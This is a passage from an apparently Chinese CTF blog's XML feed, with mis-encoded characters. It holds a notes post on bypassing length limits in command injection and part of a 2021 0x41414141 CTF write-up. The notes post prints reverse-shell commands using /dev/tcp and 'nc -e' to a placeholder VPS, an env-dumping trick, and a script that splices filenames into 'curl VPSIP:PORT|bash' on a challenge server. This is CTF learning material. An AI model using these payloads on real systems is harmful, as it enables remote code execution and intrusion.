æŒ‰Fæ³¨å…¥ã€‚æ˜¯ä¸ª PostgreSQL çš„æ³¨å…¥ï¼Œè¿˜æ²¡åšè¿‡ç±»ä¼¼çš„å”‰ï¼Œæœ‰ç‚¹æ„æ€ï¼Œåé¢å†æ¥å¤ç°å§ï¼Œå–µå–µ~</p><p><em>ï¼ˆæºœäº†æºœäº†å–µ</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | é™åˆ¶é•¿åº¦ä¸‹çš„å‘½ä»¤æ‰§è¡Œ æŠ€å·§æ±‡æ€»</title>
      <link href="2021/01/31/CTF_web_CommandExecutionLimitedLength/"/>
      <url>2021/01/31/CTF_web_CommandExecutionLimitedLength/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘æ‰“ CTF çš„æ—¶å€™é‡åˆ°äº†ä¸ª <strong>å‘½ä»¤æ‰§è¡Œ</strong> çš„ web é¢˜ç›®ï¼Œä½†æ˜¯å®ƒ<strong>é™åˆ¶äº†å‘½ä»¤çš„é•¿åº¦</strong>ã€‚</p><p>äºæ˜¯æŸ¥äº†ä¸€äº›èµ„æ–™ï¼Œæ­£å¥½å°±æ¥æ€»ç»“ä¸€ä¸‹ä¸€äº›ç›¸å…³çš„å°æŠ€å·§å§ï¼Œå–µ~</p><br><h2 id="é»˜è®¤æ’åº"><a href="#é»˜è®¤æ’åº" class="headerlink" title="é»˜è®¤æ’åº"></a>é»˜è®¤æ’åº</h2><p><code>ls</code> é»˜è®¤çš„æ’åºæ˜¯æŒ‰ç…§å­—æ¯é¡ºåºæ¥çš„ï¼Œä¸€ä¸ªä¸€ä¸ªå­—ç¬¦æ¥çœ‹ï¼Œ<code>|</code> =&gt; ç©ºæ ¼ =&gt; æ•°å­— =&gt; å­—æ¯ã€‚</p><p>ä»¥ <code>-</code> å¼€å¤´çš„æ–‡ä»¶åä¸çœ‹ <code>-</code>ï¼Œä»ä¹‹åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹æ¯”è¾ƒã€‚</p><br><h2 id="ä¸€äº›-tricks"><a href="#ä¸€äº›-tricks" class="headerlink" title="ä¸€äº› tricks"></a>ä¸€äº› tricks</h2><ol><li><p>Linux ä¸‹å¯ä»¥ç”¨ <code>\</code> æ¥æ‹¼æ¥å‘½ä»¤ï¼Œå®ç°å‘½ä»¤ç»­è¡Œï¼Œç”Ÿæˆæ–‡ä»¶çš„è¯æ–‡ä»¶åè¦åŒå†™ <code>\\</code>ï¼Œæ¯”å¦‚ <code>&gt;ls\\</code>ã€‚</p></li><li><p>æ³¨æ„ä¸è¦ç”¨ <code>.</code> ä½œä¸ºæ–‡ä»¶åçš„å¼€å¤´ï¼Œå› ä¸º Linux ä¸‹ <code>.</code> ä¼šä½œä¸ºéšè—æ–‡ä»¶ï¼Œç›´æ¥ç”¨ <code>ls</code> åˆ—ä¸å‡ºæ¥ã€‚</p></li><li><p>ä¸ºäº†ä¸æŒ‰ç…§é»˜è®¤é¡ºåºæ’åºï¼Œå¯ä»¥ç”¨ <code>ls -t</code>ï¼ŒæŒ‰ç…§æ—¶é—´é¡ºåºï¼Œåæ‰§è¡Œçš„æ’å‰é¢ï¼Œäºæ˜¯å¯ä»¥æ‹†åˆ†å‘½ä»¤å†æ‹¼æ¥æ¥å®ç°ã€‚</p></li><li><p><code>dir a b&gt;c</code> åªä¼šå°† a b å†™åˆ°æ–‡ä»¶ c ä¸­ï¼Œè€Œå…¶ä»–çš„æ–‡ä»¶åˆ™ä¸ä¼šã€‚</p></li><li><p>ç”¨ <code>*</code> å¯ä»¥å¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•åŠæ–‡ä»¶åï¼Œè€Œä¸”èƒ½ç”¨æ–‡ä»¶åæ‰§è¡Œå‘½ä»¤ã€‚</p><p><img src="/2021/01/31/CTF_web_CommandExecutionLimitedLength/image-20210131225509319.png" alt="*"></p></li><li><p>åˆ©ç”¨ <code>rev</code> å‘½ä»¤å¯ä»¥æ‰§è¡Œååºï¼Œå…ˆç”Ÿæˆä¸€ä¸ªåä¸º <code>rev</code> çš„æ–‡ä»¶ï¼Œå†æ‰§è¡Œ <code>*v</code>ï¼Œç”±äº Linux çš„é€šé…ç¬¦ï¼Œå°±ç›¸å½“äºæ‰§è¡Œäº† <code>rev v</code>ï¼Œå¤ªå¦™äº†ï¼  </p><p><img src="/2021/01/31/CTF_web_CommandExecutionLimitedLength/image-20210131233131781.png"></p></li><li><p>è¿˜å¯ä»¥ç”¨ <code>ls -th</code>ï¼Œ<code>-h</code> ä¸å½±å“æ‰§è¡Œï¼Œä½† <code>ht-</code> å°±èƒ½æ’åˆ° <code>sl</code> å‰é¢å»ï¼Œæ­é… <code>*v</code> ä½¿ç”¨æ›´å¥½äº†ã€‚</p><blockquote><p>-h, â€“human-readable       with -l and -s, print sizes like 1K 234M 2G etc.</p></blockquote></li><li><p>PHP ä»£ç æ‰§è¡Œ <code>exec</code> æ—¶ï¼Œåªéœ€è¦è¾“å…¥<code>\</code> å³å¯ç”Ÿæˆ <code>\\</code>ï¼Œæ¯”å¦‚ <code>exec("&gt;ls\")</code> å³å¯ï¼Œè¿˜èƒ½çœä¸€ä¸ªå­—ç¬¦å‘¢ã€‚</p></li><li><p>åå¼¹ shell æ—¶å€™ç”¨çš„ IP å¯ä»¥æ¢æˆåè¿›åˆ¶ä¸å¸¦å°æ•°ç‚¹çš„ã€‚<em>ï¼ˆå™¢ä½ æœ‰çŸ­åŸŸåå•Šï¼Œæ²¡äº‹äº†ï¼‰</em></p></li><li><p>å¯ä»¥ä¾æ¬¡æ‰§è¡Œ <code>&gt;env</code>, <code>*&gt;x</code>ï¼Œç›¸å½“äºæ‰§è¡Œ <code>env&gt;x</code>ï¼Œå°±èƒ½åœ¨ <code>x</code> æ–‡ä»¶é‡Œå¾—åˆ°ç¯å¢ƒå˜é‡é‡Œçš„å†…å®¹ã€‚</p></li></ol><br><h2 id="å‚è€ƒ-Payload"><a href="#å‚è€ƒ-Payload" class="headerlink" title="å‚è€ƒ Payload"></a>å‚è€ƒ Payload</h2><p>è¿™ä¸ªæ˜¯<strong>åå¼¹ shell</strong> çš„æ€è·¯ã€‚</p><p>æœ€å¼€å§‹éœ€è¦åœ¨ VPS æŸä¸ªé¡µé¢ä¸Šæ”¾ä¸ªåå¼¹ shell çš„è„šæœ¬ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">&gt;&amp;</span> /dev/tcp/VPSIP/PORT <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span class="token comment"># æˆ–è€… nc -e /bin/sh VPSIP PORT</span></code></pre><p>ç„¶åèµ·ä¸ªæœåŠ¡ç›‘å¬è¿™ä¸ªç«¯å£ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvvp PORT</code></pre><p>è¦è¢«æ‰“çš„æœºå™¨ä¸Šï¼Œå…ˆç”Ÿæˆ <code>ls -th &gt; g</code>ï¼Œè€Œåæ–‡ä»¶åæ‹¼æ¥å®ç° <code>curl VPSIP:PORT|bash</code>ï¼Œç„¶åæ‰§è¡Œ <code>sh x</code> ç”Ÿæˆåå¼¹çš„å‘½ä»¤ï¼Œæœ€å <code>sh g</code> è§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œåœ¨ VPS ä¸Šæ‹¿åˆ° shellã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quotebaseurl <span class="token operator">=</span> <span class="token string">"http://207.180.200.166:8000/?cmd="</span>reset <span class="token operator">=</span> <span class="token string">"http://207.180.200.166:8000/?reset"</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>reset<span class="token punctuation">)</span><span class="token comment"># æ–‡ä»¶ x å†…å®¹ä¸º ls -th &gt; g</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">"&gt;sl"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;ht-"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;g\&gt;"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;dir"</span><span class="token punctuation">,</span>    <span class="token string">"*&gt;v"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;rev"</span><span class="token punctuation">,</span>    <span class="token string">"*v&gt;x"</span><span class="token punctuation">]</span><span class="token comment"># curl VPSIP:PORT|bash</span>list2 <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">"&gt;bash"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;\|\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;11\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;11\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;1:\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;11\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;1.\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;11\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;11.\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;11.\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;\ \\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;rl\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;cu\\"</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> list1<span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sending"</span><span class="token punctuation">,</span> quote<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'==&gt;'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> list2<span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sending"</span><span class="token punctuation">,</span> quote<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'==&gt;'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sh x'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>baseurl<span class="token operator">+</span>quote<span class="token punctuation">(</span><span class="token string">"sh x"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'==&gt;'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sh g'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>baseurl<span class="token operator">+</span>quote<span class="token punctuation">(</span><span class="token string">"sh g"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'==&gt;'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>reset<span class="token punctuation">)</span></code></pre><br><h2 id="å‚è€ƒé¢˜ç›®"><a href="#å‚è€ƒé¢˜ç›®" class="headerlink" title="å‚è€ƒé¢˜ç›®"></a>å‚è€ƒé¢˜ç›®</h2><p><strong>0x41414141 CTF 2021 hackme:</strong></p><p><a href="https://miaotony.xyz/2021/01/31/CTF_2021_0x41414141/#hackme">CTF | 2021 0x41414141CTF éƒ¨åˆ† WriteUp</a></p><br><p><strong>HITCON 2017 BabyFirst Revenge:</strong></p><p><a href="https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/">HITCON 2017 CTF BabyFirst Revenge</a> </p><p>è¿™ä¸ªç”¨ <code>tar</code> å‹ç¼©å¾—åˆ°æ ¹ç›®å½•ä¸‹æ–‡ä»¶ï¼Œä¸è¿‡å‰ææ˜¯å½“å‰ç›®å½•çš„æ–‡ä»¶èƒ½ä¸‹è½½ï¼Œphp å€’æ˜¯å¯ä»¥ã€‚</p><p><a href="https://github.com/bennofs/docs/blob/master/hitcon-2017/baby-first-revenge2.md">Baby First Revenge v2 <em>(GitHub)</em></a></p><p>é‡Œé¢è¿˜æœ‰ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„æ“ä½œï¼ˆ</p><br><p>ä»¥åŠä¸€äº› <strong>æ±‡æ€»</strong>ï¼š</p><p>ä¸»è¦ä¹Ÿæ˜¯ HITCON çš„é¢˜ç›®<small><em>ï¼ˆæ€ä¹ˆè¿™ä¹ˆå–œæ¬¢å‡º</em></small></p><p><a href="https://blog.csdn.net/bajinsheng/article/details/78703249">å‘½ä»¤æ³¨å…¥çªç ´é•¿åº¦é™åˆ¶ | ä»CTFé¢˜ç›®è®²èµ·</a></p><br><hr><h2 id="References-amp-Extensive-Reading"><a href="#References-amp-Extensive-Reading" class="headerlink" title="References &amp; Extensive Reading"></a>References &amp; Extensive Reading</h2><p><a href="https://www.freebuf.com/articles/web/154453.html">æŒ–æ´ç»éªŒ | å‘½ä»¤æ³¨å…¥çªç ´é•¿åº¦é™åˆ¶</a></p><p><a href="https://xz.aliyun.com/t/2748">ä»ä¸€é“ctfé¢˜ç›®å­¦åˆ°çš„ç»•è¿‡é•¿åº¦æ‰§è¡Œå‘½ä»¤å§¿åŠ¿</a></p><p><a href="https://zhuanlan.zhihu.com/p/127047303">CTFä¸­çš„å‘½ä»¤æ‰§è¡Œç»•è¿‡</a></p><p><em>ï¼ˆæºœäº†å–µ</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Notes </tag>
            
            <tag> Tricks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 0x41414141CTF éƒ¨åˆ† WriteUp</title>
      <link href="2021/01/31/CTF_2021_0x41414141/"/>
      <url>2021/01/31/CTF_2021_0x41414141/</url>
      
        <content type="html"><![CDATA[<p>å–µå–µï¼Œæœ€è¿‘ CTF æ¯”è¾ƒå¤šï¼Œæ‘¸é±¼èµ·æ¥æ¯”è¾ƒå¿™ï¼Œä»¥è‡³äºå¥½å‡ ç¯‡åšå®¢éƒ½å’•äº†ã€‚</p><p>å™¢æˆ‘æ•°æ•°ï¼Œä¸€ç¯‡ä¸¤ç¯‡ï¼Œä¸å¯¹ï¼Œå·²ç»åœ¨è·¯ä¸Šäº† 2333ã€‚</p><p>è¿™ç¯‡å±…ç„¶å°±æˆäº† <strong>2021 å¹´çš„æ–°å¹´ç¬¬ä¸€ç¯‡</strong>ï¼Œé‚£å…ˆ <strong>ç¥å¤§å®¶æ–°å¹´å¿«ä¹å–µ~</strong> </p><p><em>ï¼ˆè™½ç„¶æ™šäº†ç‚¹ï¼Œé—®é¢˜ä¸å¤§</em></p><hr><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p><img src="/2021/01/31/CTF_2021_0x41414141/TopLogo.gif"></p><p>è¿™åº”è¯¥æ˜¯ç¬¬ä¸€æ¬¡æ¥çœ‹å›½å¤–çš„ CTF æ¯”èµ›å”‰ã€‚</p><p>èµ·å› å…¶å®æ˜¯æœ‰å¸ˆå‚…æ¥é—®æˆ‘è¿™ä¸ªæ¯”èµ›æ€ä¹ˆæ³¨å†Œï¼Œå‡†ç¡®åœ°è¯´æ˜¯æ‰¾ä¸åˆ°æ³¨å†Œç”¨çš„ PIN code åœ¨å“ªï¼ˆ</p><p>ç„¶åæˆ‘å°±é¡ºä¾¿æ¥çœ‹çœ‹é¢˜äº† 233.</p><p>å½“ç„¶ä¸»è¦è¿˜æ˜¯çœ‹äº† Misc é¢˜å§ã€‚</p><blockquote><p>ä»‹ç»é¡µé¢ï¼š <a href="https://ctf.offshift.io/">https://ctf.offshift.io/</a></p><p>å¹³å°ç½‘å€ï¼š <a href="https://ctfd.offshift.io/">https://ctfd.offshift.io/</a></p><p>Discordï¼š <a href="https://discord.com/invite/heKqkmWpbk">https://discord.com/invite/heKqkmWpbk</a></p><p>è¿™ä¸ªæ¯”èµ›æŒç»­äº†ä¸€å‘¨ï¼Œä» 20210124T0000 UTC+8 å¼€å§‹ï¼Œä¸€ç›´åˆ° 20210131T0000 UTC+8.</p></blockquote><h2 id="Secret-Pin-Code"><a href="#Secret-Pin-Code" class="headerlink" title="Secret Pin Code"></a>Secret Pin Code</h2><p>è¿˜å¡æ³¨å†Œï¼Œå¤ªåäº†ï¼</p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210126225656165.png" alt="pin code"></p><p>About é‡Œå‘Šè¯‰æˆ‘ä»¬</p><blockquote><ul><li>The secret pin code for CTF entry is hidden somewhere on this site</li></ul></blockquote><p>äºæ˜¯å·¨å¤šäººåœ¨ discord é‡Œé—®ä¸»åŠæ–¹è¿™ä¸ªåœ¨å“ªé‡Œã€‚</p><p>æ ¹æ®ä¸»åŠæ–¹å‡ æ¡ä¸åŒçš„å›å¤ï¼Œæ„æ€æ˜¯å°±åœ¨ <a href="https://ctfd.offshift.io/">https://ctfd.offshift.io/</a> è¿™ä¸ª domain ä¸‹ï¼ŒHTML æºç é‡Œæ²¡æœ‰ã€‚</p><p>ç„¶åæˆ‘å’Œå…¶ä»–å¸ˆå‚…ä¸€èµ·æ‰¾äº†ä¸€æ™šä¸Šã€‚ã€‚</p><p>web é¢˜ç›®å¸¸è§çš„åœ°æ–¹éƒ½æ‰¾äº†ï¼ŒJS æºç ã€HTTP2 Server Push éƒ½å»çœ‹äº†ï¼Œéƒ½æ²¡å‘ç°ã€‚</p><p>åæ¥æƒ³æ˜¯ä¸æ˜¯ gif éšå†™å•Šï¼Œå…ˆæ˜¯çœ‹äº† Top Logoï¼Œå°±ä»–é¦–é¡µå¤§å›¾ï¼Œæˆ–è€…è¿™ç¯‡æ–‡ç« ä¸€å¼€å§‹çš„é‚£å¼ å›¾ã€‚å‘ç°å¹¶æ²¡æœ‰ã€‚</p><p>å†åæ¥ï¼Œæ˜¯ä¸æ˜¯ç½‘ç«™å·¦ä¸Šè§’è¿™ä¸ª logo å•Šã€‚</p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210126224523501.png" alt="logo"></p><p>ä¹Ÿå°±æ˜¯ä¸‹é¢è¿™å¼ å›¾ã€‚</p><p><img src="/2021/01/31/CTF_2021_0x41414141/CTF3.gif" alt="CTF3"></p><p>ç„¶åå‘ç°æ–‡ä»¶æœ€ç»“å°¾éšå†™äº†ã€‚</p><p>è‰æ­»äº†ã€‚</p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210126224653643.png" alt="secret"></p><pre class="language-none"><code class="language-none">secret: 100100100101</code></pre><p>PIN ä¸€èˆ¬æ˜¯4-6ä½ï¼Œäºæ˜¯è½¬åè¿›åˆ¶ï¼Œå³ <code>2341</code>.</p><p>ç„¶åæ³¨å†Œå°±å¥½äº†ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Optimizer"><a href="#Optimizer" class="headerlink" title="Optimizer"></a>Optimizer</h3><blockquote><p>EU instance: 207.180.200.166 9660 </p><p>US instance: 45.134.3.200 9660</p></blockquote><h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h4><p><strong>tower of hanoi</strong></p><p>æ±‰è¯ºå¡”ï¼Œå¥½å”‰ã€‚</p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210126221753360.png" alt="level 1"></p><p>è¯•äº†ä¸€ä¸‹ï¼Œä»–è¿™ä¸ª list çš„é•¿åº¦å°±æ˜¯æœ€åˆå§‹çš„åœ†ç›˜æ•°é‡ã€‚</p><p>æ‰¾äº†ä¸ªæ±‰è¯ºå¡”çš„é€’å½’å®ç°ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># nä¸ºåœ†ç›˜æ•°ï¼Œaä»£è¡¨åˆå§‹ä½åœ†æŸ±ï¼Œbä»£è¡¨è¿‡æ¸¡ä½åœ†æŸ±ï¼Œcä»£è¡¨ç›®æ ‡ä½åœ†æŸ±</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">'--&gt;'</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># å°†åˆå§‹ä½çš„n-1ä¸ªåœ†ç›˜ç§»åŠ¨åˆ°è¿‡æ¸¡ä½ï¼Œæ­¤æ—¶åˆå§‹ä½ä¸ºaï¼Œä¸Šä¸€çº§å‡½æ•°çš„è¿‡æ¸¡ä½bå³ä¸ºæœ¬çº§çš„ç›®æ ‡ä½ï¼Œä¸Šçº§çš„ç›®æ ‡ä½cä¸ºæœ¬çº§çš„è¿‡æ¸¡ä½</span>        move<span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> c<span class="token punctuation">,</span> b<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">'--&gt;'</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>        <span class="token comment"># å°†è¿‡æ¸¡ä½çš„n-1ä¸ªåœ†ç›˜ç§»åŠ¨åˆ°ç›®æ ‡ä½ï¼Œæ­¤æ—¶åˆå§‹ä½ä¸ºbï¼Œä¸Šä¸€çº§å‡½æ•°çš„ç›®æ ‡ä½cå³ä¸ºæœ¬çº§çš„ç›®æ ‡ä½ï¼Œä¸Šçº§çš„åˆå§‹ä½aä¸ºæœ¬çº§çš„è¿‡æ¸¡ä½</span>        move<span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> b<span class="token punctuation">,</span> a<span class="token punctuation">,</span> c<span class="token punctuation">)</span></code></pre><p>ä½†æ˜¯è¿™é‡Œå¹¶ä¸éœ€è¦æ‰§è¡Œè¿™ä¸ªè¿‡ç¨‹ï¼Œåªç”¨å…³å¿ƒç§»åŠ¨çš„æ¬¡æ•°å³å¯ã€‚</p><p>å¯ä»¥å‘ç°é€’æ¨å…¬å¼æ˜¯ $ f(n)=2*f(n-1)+1 $</p><p>äºæ˜¯ payload</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">###### level 1 #######</span><span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> cnt<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        cnt <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">return</span> cnt    cnt <span class="token operator">=</span> solve<span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> cnt<span class="token punctuation">)</span>    cnt <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> cnt <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">return</span> cntsh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'45.134.3.200'</span><span class="token punctuation">,</span> <span class="token number">9660</span><span class="token punctuation">)</span><span class="token comment"># sh = remote('207.180.200.166', 9660)</span><span class="token comment"># level 1: tower of hanoi</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'+++++++++ Level 1 ++++++++\n'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'level 1: tower of hanoi\n'</span><span class="token punctuation">)</span>cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'level'</span> <span class="token keyword">in</span> r<span class="token punctuation">:</span>        <span class="token keyword">break</span>    data <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'(\[.+\])'</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    x <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-----&gt;'</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span>    num <span class="token operator">=</span> solve<span class="token punctuation">(</span>length<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'=====&gt;'</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'&gt; '</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>    cnt <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'~~~'</span><span class="token punctuation">,</span> cnt<span class="token punctuation">,</span> <span class="token string">'~~~'</span><span class="token punctuation">)</span>  <span class="token comment"># 25</span></code></pre><p>å‘ç° 25æ¬¡äº¤äº’ä¹‹åå°±åˆ°äº†ç¬¬äºŒå…³ã€‚</p><h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h4><p><strong>merge sort, give me the count of inversions</strong></p><p>ä»–çš„æ„æ€æ˜¯ï¼Œå¯¹ç»™å®šçš„æ•°ç»„åšå½’å¹¶æ’åºï¼Œç»™å‡ºé€†åºæ•°ã€‚</p><p><em>ï¼ˆè¯´å®è¯åˆšå¼€å§‹æ²¡çœ‹æ‡‚è¿™ä¸ªå•¥æ„æ€</em></p><blockquote><p>inversion é€†åºæ•°<br>Definition:<br> å¯¹æ•°ç»„a[], å­˜åœ¨ä¸€å¯¹ (i, j) æœ‰i &lt; j ä¸” a[i] &gt; a[j] å³ä¸ºä¸€ä¸ªé€†åºæ•°å¯¹ </p><p> e.g.<br> {1,3,5,2,4,6} é€†åºæ•°ä¸º3<br> i.e. (3,2) (5,2) (5,4)</p><p>mergesort çš„å¤§è‡´æ€è·¯ï¼Œå°±æ˜¯å°†ä¸€ä¸ªæ•°ç»„å¹³å‡åˆ†æˆå·¦å³ä¸¤ä¸ªå­æ•°ç»„ï¼Œåˆ†åˆ«è°ƒç”¨æ’åºå‡½æ•°æœ¬èº«ï¼Œè¿”å›çš„æ˜¯ä¸¤ä¸ªå·²æ’åºçš„æ•°ç»„ï¼Œç„¶åå†å°†å…¶ merge èµ·æ¥ã€‚æ—¶é—´å¤æ‚åº¦æ˜¯ O(nÂ·log n)ã€‚</p></blockquote><p>å‚è€ƒ <a href="https://www.cnblogs.com/yemiyemi/p/4262749.html">å¹¶å½’æ’åºå’Œé€†åºæ•°è®¡ç®— Merge Sort and Counting Inversions</a></p><blockquote><p> å¹¶å½’æ’åº(Merge Sort)æ˜¯ä¸€ç§ä½¿ç”¨åˆ†æ²»æ³•(Divided-and-Conquer)æ€è·¯è®¾è®¡çš„æ’åºç®—æ³• </p><p> 